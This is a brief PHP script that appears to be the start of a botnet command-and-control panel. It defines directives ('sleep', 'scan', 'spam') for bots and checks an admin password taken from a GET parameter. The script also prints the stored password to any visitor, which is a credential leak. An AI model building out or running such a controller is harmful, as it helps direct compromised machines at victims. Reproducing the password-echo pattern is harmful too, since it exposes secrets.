<?php

	// Our db connection
	include_once("/var/includes/dbConnect.inc");

        // Functions shared by the various scripts
        include_once("./includes/functions.php");

	/*
	 * Some variables and constants that control authentication
	 * and responses given to bots
	 */

	$adminInitialPwd 	= getDBParam("botInitialPwd"); 
	$currentDirective	= getDBParam("currentDirective");
	$initialResponse 	= getDBParam("initialResponse"); 
	$initialResponsesList	= array("sleep", "start");
	$directivesList		= array("sleep", "scan", "spam");

	echo $adminInitialPwd;
	echo $currentDirective;

	 $adminPwd  = filter_var($_GET['adminPwd']);
        $showConnections = filter_var($_GET['showConnections']);
        if ( $adminPwd === $adminInitialPwd ) {
		echo "yes";
	} else {
		echo "no";
	}


?>

